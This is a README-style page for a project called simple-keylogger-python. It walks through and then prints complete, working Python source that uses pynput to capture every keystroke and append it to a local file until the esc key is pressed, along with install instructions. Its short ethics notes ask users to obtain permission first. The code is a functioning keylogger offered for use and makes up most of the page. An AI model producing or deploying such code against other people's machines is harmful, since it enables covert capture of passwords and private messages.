# simple-keylogger-python

Imports:

from pynput import keyboard: Importing the necessary modules from the pynput library.

Log File:

log_file = "keylog.txt": Specifies the file where keystrokes will be logged.

Key Logging:

key_log = []: A list to keep track of the keys pressed before writing them to the file.

on_press Function:

def on_press(key): This function is called whenever a key is pressed.
It attempts to add the character representation of the key to the log.
If the key has no character representation (like special keys), it checks if it's the space key or any other key.
Logs spaces as " " and other keys in a [key.name] format.
Writes the keys to the log file and clears the key_log list.

on_release Function:

def on_release(key): This function is called whenever a key is released.
If the esc key is released, it stops the listener.

Listener:

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: Sets up the listener to capture key press and release events.
listener.join(): Starts the listener and keeps it running until the esc key is pressed.

Important Notes:

Permissions: Always obtain explicit permission from all users involved before running a keylogger.
Ethical Use: Use this script only for ethical and legal purposes, such as educational demonstrations or monitoring your own devices.

First, ensure you have the pynput library installed. You can install it using pip:

```
bash
pip install pynput
```
Here is the Python code for a basic keylogger:

python code from pynput import keyboard

```
# Define the log file
log_file = "keylog.txt"

# This variable will keep track of the keys pressed
key_log = []

# Function to handle key press events
def on_press(key):
    try:
        key_log.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            key_log.append(" ")
        else:
            key_log.append(f"[{key.name}]")

    # Save the logged keys to the file
    with open(log_file, "a") as file:
        file.write(''.join(key_log))
        key_log.clear()

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
